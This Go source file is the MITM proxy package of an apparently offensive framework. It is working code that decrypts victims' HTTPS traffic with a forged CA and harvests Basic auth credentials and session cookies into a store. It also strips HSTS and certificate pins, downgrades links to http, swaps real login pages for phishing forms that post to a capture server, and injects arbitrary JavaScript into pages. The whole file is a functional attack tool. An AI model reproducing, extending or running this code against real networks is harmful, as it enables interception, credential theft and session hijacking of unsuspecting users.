// Package proxy implements the inline HTTP(S) MITM proxy used by the
// http.proxy, https.proxy and phish.inject modules. It is built on goproxy:
// traffic is decrypted (when the framework CA is trusted), credentials and
// sessions are harvested into the store, and responses can be rewritten.
package proxy

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"regexp"
	"strings"
	"sync/atomic"
	"time"

	"github.com/elazarl/goproxy"

	"github.com/QYVORA/qyvora-toha3ee/internal/events"
	"github.com/QYVORA/qyvora-toha3ee/internal/hijack"
	"github.com/QYVORA/qyvora-toha3ee/internal/phish"
	"github.com/QYVORA/qyvora-toha3ee/internal/store"
	"github.com/QYVORA/qyvora-toha3ee/pkg/certutil"
)

// MaxBody is the largest response body the proxy will buffer for rewriting.
// Buffering is needed to swap login pages and inject JS; bodies larger than
// this are passed through untouched.
const MaxBody = 2 << 20

// Config configures the MITM proxy.
type Config struct {
	ListenAddr string
	// CA enables HTTPS MITM when non-nil; when nil CONNECT tunnels are
	// accepted without interception.
	CA *certutil.CA
	DB *store.Store
	// Bus receives harvest events.
	Bus *events.Bus
	// Injector applies hijack cookie/header injections.
	Injector *hijack.Injector
	// PhishDomains maps a request host to a template ID to swap login pages
	// with (empty map disables form swapping).
	PhishDomains map[string]string
	// PhishCaptureURL is the absolute base URL of the capture server used as
	// the swapped form action, e.g. "http://192.168.8.116:8081".
	PhishCaptureURL string
	// InjectedJS is an optional snippet injected into every HTML response.
	InjectedJS string
	// SSLStrip enables HSTS-header stripping and rewriting https:// absolute
	// links to http:// in HTML responses, defeating the HSTS upgrade that
	// would otherwise force clients back onto HTTPS.
	SSLStrip bool
	Log      *slog.Logger
}

// MITMProxy is a running HTTP(S) MITM proxy.
type MITMProxy struct {
	cfg Config
	gop *goproxy.ProxyHttpServer
	srv *http.Server
	ln  net.Listener

	requests atomic.Int64 // requests handled
	harvest  atomic.Int64 // credentials/sessions captured
	swaps    atomic.Int64 // login pages swapped
}

// New builds the proxy handler wiring all hooks.
func New(cfg Config) *MITMProxy {
	if cfg.ListenAddr == "" {
		cfg.ListenAddr = "0.0.0.0:8080"
	}
	if cfg.PhishDomains == nil {
		cfg.PhishDomains = map[string]string{}
	}
	p := &MITMProxy{cfg: cfg}
	p.gop = goproxy.NewProxyHttpServer()
	p.gop.Verbose = false
	// Route goproxy's own diagnostics through slog at warn level so the
	// noisy proxy internals do not spam the application log.
	p.gop.Logger = slog.NewLogLogger(slog.Default().Handler(), slog.LevelWarn)

	// Default: pass CONNECT tunnels through untouched. With a CA we instead
	// terminate TLS ourselves and decrypt the traffic.
	connectAction := &goproxy.ConnectAction{Action: goproxy.ConnectAccept}
	if cfg.CA != nil {
		tlsCA := &tls.Certificate{Certificate: [][]byte{cfg.CA.Cert.Raw}, PrivateKey: cfg.CA.Key}
		connectAction = &goproxy.ConnectAction{
			Action:    goproxy.ConnectMitm,
			TLSConfig: goproxy.TLSConfigFromCA(tlsCA),
		}
	}
	p.gop.OnRequest().HandleConnect(goproxy.FuncHttpsHandler(func(host string, ctx *goproxy.ProxyCtx) (*goproxy.ConnectAction, string) {
		return connectAction, host
	}))
	p.gop.OnRequest().DoFunc(p.onRequest)
	p.gop.OnResponse().DoFunc(p.onResponse)
	return p
}

// Start binds the listener and begins serving. It returns the bound address.
func (p *MITMProxy) Start() (string, error) {
	ln, err := net.Listen("tcp", p.cfg.ListenAddr)
	if err != nil {
		return "", fmt.Errorf("proxy listen %s: %w", p.cfg.ListenAddr, err)
	}
	p.ln = ln
	p.srv = &http.Server{
		Handler:           p.gop,
		ReadTimeout:       60 * time.Second,
		WriteTimeout:      60 * time.Second,
		IdleTimeout:       60 * time.Second,
		MaxHeaderBytes:    1 << 20,
		ReadHeaderTimeout: 15 * time.Second,
	}
	go func() { _ = p.srv.Serve(ln) }()
	return ln.Addr().String(), nil
}

// Addr returns the bound listener address.
func (p *MITMProxy) Addr() string {
	if p.ln == nil {
		return p.cfg.ListenAddr
	}
	return p.ln.Addr().String()
}

// Stop shuts the server down and closes the listener. It uses a bounded
// shutdown context so hanging connections cannot block Stop forever.
func (p *MITMProxy) Stop() {
	if p.srv != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		_ = p.srv.Shutdown(ctx)
		p.srv = nil
	}
}

// Stats returns (requests handled, harvests captured, form swaps served).
func (p *MITMProxy) Stats() (requests, harvest, swaps int64) {
	return p.requests.Load(), p.harvest.Load(), p.swaps.Load()
}

// TLSEnabled reports whether this proxy intercepts HTTPS.
func (p *MITMProxy) TLSEnabled() bool { return p.cfg.CA != nil }

// Harvests returns the number of captured credentials/sessions.
func (p *MITMProxy) Harvests() int64 { return p.harvest.Load() }

// victimIP extracts the client's IP (without port) from RemoteAddr.
func (p *MITMProxy) victimIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

// onRequest is the request hook: applies injections, harvests Basic auth and
// logs the traffic. Returning (r, nil) forwards the request unchanged.
func (p *MITMProxy) onRequest(r *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
	p.requests.Add(1)
	victim := p.victimIP(r)

	// Inject tracking/session cookies and headers into the victim's request.
	if p.cfg.Injector != nil {
		p.cfg.Injector.Apply(victim, r.URL.Host, func(name, value string) {
			c := &http.Cookie{Name: name, Value: value, Path: "/"}
			r.AddCookie(c)
		}, func(k, v string) {
			r.Header.Set(k, v)
		})
	}

	// Basic auth credentials arrive as "Basic <base64(user:pass)>"; the raw
	// header value is stored (decoding is left to the analyst) and flagged.
	if h := r.Header.Get("Authorization"); strings.HasPrefix(h, "Basic ") {
		p.harvest.Add(1)
		if p.cfg.DB != nil {
			p.cfg.DB.AddCred(store.Cred{
				Service:  r.URL.Scheme,
				Username: "(basic auth)",
				Password: h,
				Host:     r.URL.Host,
				VictimIP: victim,
				VictimUA: r.UserAgent(),
				Source:   "http.proxy",
				Time:     time.Now(),
			})
		}
	}

	if p.cfg.Log != nil {
		// ctx.Resp == nil indicates this is a plain (un-MITM'd) request.
		p.cfg.Log.Info("proxy request", "method", r.Method, "url", r.URL.String(), "victim", victim, "tls", ctx.Resp == nil && r.URL.Scheme == "https")
	}
	return r, nil
}

// onResponse is the response hook: captures Set-Cookie sessions, applies
// sslstrip and rewrites HTML bodies (phishing swap or JS injection).
func (p *MITMProxy) onResponse(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
	if resp == nil {
		return nil
	}
	victim := p.victimIP(ctx.Req)
	p.captureCookies(ctx.Req, resp, victim)

	if p.cfg.SSLStrip {
		p.stripHSTS(resp, ctx.Req)
	}

	// Only HTML bodies are rewritten; everything else is streamed through.
	if contentTypeIsHTML(resp) {
		// Read the whole body (bounded by MaxBody) so it can be rewritten.
		body, err := io.ReadAll(io.LimitReader(resp.Body, MaxBody))
		_ = resp.Body.Close()
		if err != nil {
			return resp
		}
		if p.cfg.SSLStrip {
			body = rewriteHTTPSLinks(body, resp)
		}
		// Phishing swap takes priority; otherwise inject JS if configured and
		// the body actually fits (a truncated body cannot be spliced safely).
		body, replaced := p.maybeSwapForm(ctx.Req, resp, body, victim)
		if !replaced && p.cfg.InjectedJS != "" && len(body) < MaxBody {
			body = injectJS(body, []byte(p.cfg.InjectedJS))
		}
		// Replace the streamed body with the rewritten bytes and fix up the
		// length metadata so the client trusts the new Content-Length.
		resp.Body = io.NopCloser(bytes.NewReader(body))
		resp.ContentLength = int64(len(body))
		resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
	}
	return resp
}

// stripHSTS removes Strict-Transport-Security headers and rewrites Location
// redirects from https:// to http:// so the browser never learns about HSTS
// (sslstrip's core mechanic). HPKP pin headers are removed too so pinned
// sites do not reject our forged certificates.
func (p *MITMProxy) stripHSTS(resp *http.Response, req *http.Request) {
	if loc := resp.Header.Get("Location"); strings.HasPrefix(strings.ToLower(loc), "https://") {
		resp.Header.Set("Location", "http://"+loc[len("https://"):])
	}
	resp.Header.Del("Strict-Transport-Security")
	for _, k := range []string{"Public-Key-Pins", "Public-Key-Pins-Report-Only"} {
		resp.Header.Del(k)
	}
}

// rewriteHTTPSLinks rewrites https:// absolute URLs inside an HTML body to
// http:// so the victim's browser keeps using the clear-text proxy. If the
// body actually changed, any Content-Encoding must be dropped because the
// compressed stream is now invalid.
func rewriteHTTPSLinks(body []byte, resp *http.Response) []byte {
	out := httpsURLRE.ReplaceAll(body, []byte("http://"))
	if !bytes.Equal(out, body) {
		resp.Header.Del("Content-Encoding")
	}
	return out
}

var httpsURLRE = regexp.MustCompile(`(?i)https://`)

// captureCookies stores Set-Cookie sessions per victim+host.
func (p *MITMProxy) captureCookies(req *http.Request, resp *http.Response, victim string) {
	if p.cfg.DB == nil || victim == "" {
		return
	}
	for _, c := range resp.Cookies() {
		p.harvest.Add(1)
		p.cfg.DB.AddSession(store.Session{
			VictimIP: victim,
			Host:     req.URL.Host,
			Cookies:  map[string]string{c.Name: c.Value},
			Captured: time.Now(),
		})
	}
	if p.cfg.Bus != nil {
		p.cfg.Bus.Emit(events.TopicSessionCaptured,
			fmt.Sprintf("session.captured: %d cookie(s) for %s from %s", len(resp.Cookies()), req.URL.Host, victim))
	}
}

// maybeSwapForm replaces a login page with the matching phishing template and
// returns the replacement body. The returned bool reports whether a swap
// happened.
func (p *MITMProxy) maybeSwapForm(req *http.Request, resp *http.Response, body []byte, victim string) ([]byte, bool) {
	if len(p.cfg.PhishDomains) == 0 {
		return body, false
	}
	// Only hosts explicitly configured for phishing are swapped.
	id, ok := p.cfg.PhishDomains[strings.ToLower(req.URL.Hostname())]
	if !ok {
		return body, false
	}
	htmlOut, err := renderSwapped(id, p.cfg.PhishCaptureURL, req.URL.String())
	if err != nil {
		return body, false
	}
	p.swaps.Add(1)
	if p.cfg.Log != nil {
		p.cfg.Log.Info("form swapped", "brand", id, "url", req.URL.String(), "victim", victim)
	}
	// The replacement is fresh HTML: force the content type and drop any
	// encoding/ETag so caches cannot serve the stale original.
	resp.Header.Set("Content-Type", "text/html; charset=utf-8")
	resp.Header.Del("Content-Encoding")
	resp.Header.Del("ETag")
	return []byte(htmlOut), true
}

var htmlTypeRE = regexp.MustCompile(`text/html|application/xhtml`)

// renderSwapped builds the phishing page served in place of a real login
// page. The form submits to the capture server; success redirects to orig.
func renderSwapped(id, captureBase, orig string) (string, error) {
	f := phish.DefaultFields(id)
	if captureBase == "" {
		captureBase = "/"
	}
	// The swapped form posts to <captureBase>/phish/<id>/submit; the capture
	// server then redirects the victim back to the original page (orig).
	f.Action = strings.TrimRight(captureBase, "/") + "/phish/" + id + "/submit"
	f.Orig = orig
	return phish.Render(id, f)
}

// contentTypeIsHTML reports whether the response should be treated as HTML.
// An absent Content-Type is treated as HTML (best-effort for misconfigured
// servers); otherwise the media type must match an HTML family.
func contentTypeIsHTML(resp *http.Response) bool {
	if resp == nil {
		return false
	}
	ct := resp.Header.Get("Content-Type")
	if ct == "" {
		return true
	}
	return htmlTypeRE.MatchString(ct)
}

// injectJS splices the snippet into the HTML body right after <head> or
// before </head>, so it runs before the page's own scripts render.
func injectJS(body, snippet []byte) []byte {
	// Prefer the closing </head> tag; splice immediately before it.
	idx := bytes.Index(body, []byte("</head>"))
	if idx < 0 {
		// Fall back to right after an opening <head> tag.
		idx = bytes.Index(body, []byte("<head>"))
		if idx >= 0 {
			idx += len("<head>")
			out := make([]byte, 0, len(body)+len(snippet)+8)
			out = append(out, body[:idx]...)
			out = append(out, snippet...)
			out = append(out, body[idx:]...)
			return out
		}
		// No head tag at all: leave the body untouched.
		return body
	}
	out := make([]byte, 0, len(body)+len(snippet)+8)
	out = append(out, body[:idx]...)
	out = append(out, snippet...)
	out = append(out, body[idx:]...)
	return out
}
